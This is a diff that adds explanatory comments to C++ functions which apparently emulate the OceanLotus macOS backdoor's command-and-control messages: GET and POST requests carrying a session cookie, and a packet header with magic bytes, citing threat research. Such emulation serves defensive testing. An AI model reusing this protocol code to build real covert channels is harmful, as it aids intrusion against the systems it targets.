@@ -2,6 +2,15 @@
 
 #define EXPORT __attribute__((visibility("default")))
 
+/*
+buildGETRequestString
+    About:
+        builds a GET request header with the provided session ID as a cookie
+    Result:
+        std::string - containing GET request
+    CTI:
+        https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html
+*/
 std::string buildGETRequestString(std::string clientID) {
     std::ostringstream buf;
 
@@ -15,6 +24,16 @@ std::string buildGETRequestString(std::string clientID) {
     return buf.str();
 }
 
+/*
+buildPOSTRequestString
+    About:
+        builds a POST request header with the session ID, if provided, as a
+        cookie and request body containing the packet data
+    Result:
+        std::string - containing POST request
+    CTI:
+        https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html
+*/
 std::string buildPOSTRequestString(std::string lotusPacket, std::string clientID) {
     std::ostringstream buf;
 
@@ -31,6 +50,13 @@ std::string buildPOSTRequestString(std::string lotusPacket, std::string clientID
     return buf.str();
 }
 
+/*
+buildLotusHeader
+    About:
+        build the OceanLotus formatted header section
+    Result:
+        unsigned char array head is updated with the requisite header values
+*/
 void buildLotusHeader(unsigned char * head, int data_length, int key_length, unsigned char * instruction) {
     // magic bytes (4 bytes)
     memcpy(head, MAGIC_BYTES, sizeof(MAGIC_BYTES));
